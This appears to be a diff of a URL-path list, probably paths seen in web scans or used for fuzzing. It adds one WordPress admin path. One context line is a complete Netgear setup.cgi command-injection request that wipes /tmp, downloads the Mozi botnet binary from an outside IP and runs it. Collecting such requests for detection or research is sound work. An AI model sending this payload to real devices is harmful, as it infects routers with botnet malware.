@@ -9544,3 +9544,4 @@ a
 /wp-content/plugins/elementor/readme.txt
 /wp-admin/admin-ajax.php?action=rtec_send_unregister_link
 /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://123.7.245.87:34023/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1
+/wp-admin/profile.php
